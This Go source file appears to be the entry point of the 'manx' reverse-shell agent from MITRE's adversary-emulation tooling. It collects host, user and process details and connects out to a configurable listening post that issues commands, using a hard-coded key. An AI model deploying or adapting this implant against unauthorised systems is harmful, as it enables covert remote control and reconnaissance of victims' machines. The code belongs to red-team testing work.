package main

import (
	"github.com/mitre/manx/shells/output"
	"github.com/mitre/manx/shells/sockets"
	"github.com/mitre/manx/shells/util"
	"flag"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
)

var (
   key = "94699f9970213dd1d4054ca678f1278a"
   contact = "tcp"
   socket = "0.0.0.0:5678"
   http = "http://localhost:8888"
)

func buildProfile(socket string, executors []string) map[string]interface{} {
	host, _ := os.Hostname()
	user, _ := user.Current()
	platform := runtime.GOOS
	architecture := runtime.GOARCH

	profile := make(map[string]interface{})
	profile["server"] = socket
	profile["host"] = host
	profile["username"] = user.Username
	profile["architecture"] = runtime.GOARCH
	profile["platform"] = runtime.GOOS
	profile["location"] = os.Args[0]
	profile["pid"] = os.Getpid()
	profile["ppid"] = os.Getppid()
	profile["executors"] = strings.Join(util.DetermineExecutors(executors, platform, architecture), ",")
	profile["exe_name"] = filepath.Base(os.Args[0])
	return profile
}

func main() {
	var executors util.ListFlags
	contact := flag.String("contact", contact, "Which contact to use")
	socket := flag.String("socket", socket, "The ip:port of the socket listening post")
	http := flag.String("http", http, "The FQDN of the HTTP listening post")
	inbound := flag.Int("inbound", 6000, "A port to use for inbound connections")
	verbose := flag.Bool("v", false, "Enable verbose output")
	flag.Var(&executors, "executors", "Comma separated list of executors (first listed is primary)")
	flag.Parse()

	profile := buildProfile(*socket, executors)

	output.SetVerbose(*verbose)
	output.VerbosePrint(fmt.Sprintf("[*] %s outbound socket %s, inbound at %d", *contact, *socket, *inbound))

	coms, _ := sockets.CommunicationChannels[*contact]
	coms.Listen(*socket, *http, *inbound, profile)
}
